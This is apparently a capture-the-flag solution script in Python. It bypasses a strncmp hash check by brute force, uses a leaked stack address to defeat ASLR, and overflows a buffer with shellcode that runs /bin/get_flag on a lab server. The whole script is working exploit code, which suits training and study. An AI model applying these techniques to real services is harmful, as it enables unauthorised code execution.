#!/usr/bin/python3

import sys
import os
import socket
import time
import hashlib
import array

#NOTE: relevant non-boilerplate code starts at line 80

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky2"
    port = 13701

s = socket.socket()
s.connect((host, port))


#functions to communicate with server (based on funtions from qual.py)
def dbg_print(txt):
    debug = False
    if debug:
        print(txt.decode('utf-8'))

def recv_until_timed(delim, timeout):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while delim not in tmp and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_until(delim):
    return recv_until_timed(delim, 0)

def recv_cnt_timed(count, timeout):
    global s
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while len(tmp) < count and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_cnt(count):
    return recv_cnt_timed(count, 0)

def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)


# good_hash is compared with hash using strncmp
# strncmp compares two NULL terminated strings, but hash is binary data
# this means, although strncmp has an upper bound of bytes, 
# the function also stops when encountering a NULL byte
# Since the second byte is a NULL byte, a hash collission can be found efficiently
# (only the first two bytes need to be bruteforced. the rest doesn't matter.)
# Using this we can skip the inconvenient if-condition in line 27 of vuln.c
# Example Input with SHA256-Hash starting with 0x2a 0x00: ,bf3<EOF>

# Try random values until a hashcolission is found
while True:
    currand = os.urandom(4)
    curr_hash = hashlib.sha256(currand).digest()
    if curr_hash[0] == 0x2a and curr_hash[1] == 0x00:
        break

# Connect to hacky2 and submit the random value that triggers collission
send(currand)
recv_cnt(40 + len(currand))
currline = recv_until('\n')

# The Server returns a "magic" string, containing the address of buf
# This means we now know the loaction of the Stack in memory, despite ASLR being enabled
# To use the address we need to extract it from the magic string
# and convert it to a little endian byte string of 8 bytes (including leading NULL bytes)
buf_addr = bytearray.fromhex(currline[24:36].decode())
buf_addr.reverse()
buf_addr_bstr = bytes(buf_addr) + b"\x00\x00"

# Since executing code on the stack is not prevented in this binary, 
# we can simply write some assembly code on the stack
# The read() call with a maximum input length of 0x50 triggers a buffer overflow large enough
# to overwrite the return address.
# By setting the return address to the address of buf, we can execute our arbitrary code.
# Additionally buf is used to store the path to the file we want to execute: /bin/get_flag
# The address of this string is passed to the execve syscall via rdi
#
# Tool used to generate byte string from assembly code: https://defuse.ca/online-x86-assembler.htm
# Syscall lookup table used: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
#
#  0: 48 31 d2                xor     rdx,rdx                 const char *const envp[]
#  3: 48 31 f6                xor     rsi,rsi                 const char *const argv[]
#  6: 48 bf LO << << << <<    mov     rdi,0xHI>>>>>>>>>>>>LO  const char *filename
#  d: << << HI
# 10: 48 83 c7 0a             add    rdi,29
# 14: 48 c7 c0 3b 00 00 00    mov    rax,0x3b                 id of execve(...) syscall
# 1b: 0f 05                   syscall 
#
# -> Offset of String literal within buf is 29 Bytes (due to assembly code)
# -> "/bin/get_flag" is 13 Bytes long
# -> Offset of return address is 0x48 (=72) Bytes from buf
# => Add 30 additional NULL bytes (arbitrary) as filler and owerwrite return address with address of buf
#

buf_input =  b"\x48\x31\xD2\x48\x31\xF6\x48\xBF"
buf_input += buf_addr_bstr
buf_input += b"\x48\x83\xC7\x1D\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
buf_input += b"/bin/get_flag"
buf_input += (0x48-(29+13))*b"\x00"
buf_input += buf_addr_bstr

#Send the newly crafted exploit string and print flag
send(buf_input)
print(recv_until('\n').decode())

